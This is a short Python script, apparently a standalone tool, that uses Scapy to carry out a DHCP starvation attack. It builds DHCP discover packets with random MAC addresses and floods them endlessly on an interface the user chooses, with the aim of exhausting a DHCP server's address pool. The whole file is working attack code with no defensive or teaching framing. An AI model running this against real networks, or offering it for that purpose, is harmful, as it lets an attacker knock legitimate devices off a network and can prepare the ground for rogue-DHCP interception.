from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP, IP
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether

# Disable IP address check in Scapy configuration.
conf.checkIPaddr = False

# **************************************************************************************
# Function to list all available network interfaces using Scapy.
# **************************************************************************************
def list_interfaces():
    """
    List all available network interfaces using Scapy.
    """
    print("Available interfaces:")
    for index, iface in enumerate(conf.ifaces):
        print(f"Index: {index}, Name: {conf.ifaces[iface].name}")
        
# **************************************************************************************
# Constructing a DHCP discover packet using Scapy.
# **************************************************************************************
dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff" ,src=RandMAC()) \
                        /IP(src='0.0.0.0' ,dst='255.255.255.255') \
                        /UDP(sport=68,dport=67) \
                        /BOOTP(op=1,chaddr = RandMAC()) \
                        /DHCP(options=[("message-type", "discover"), "end"])

# **************************************************************************************
# List available interfaces and prompt user to select one.
# **************************************************************************************
list_interfaces()
selected_index = input("Please enter the interface index you want to use: ")

# **************************************************************************************
# Validate user input and select the network interface.
# **************************************************************************************
if selected_index.isdigit():
    selected_index = int(selected_index)
    if selected_index < len(conf.ifaces):
        selected_interface = list(conf.ifaces.keys())[selected_index]
        interface_name = conf.ifaces[selected_interface].name
        print(f"Using interface {interface_name} for DHCP Starvation attack.")
    else:
        print("Invalid interface index selected.")
else:
    print("Invalid input. Please enter a valid interface index.")
    
# **************************************************************************************
# Send the DHCP discover packet on the selected interface in a loop.
# **************************************************************************************    
sendp(dhcp_discover,iface=interface_name,loop=1,verbose=1)
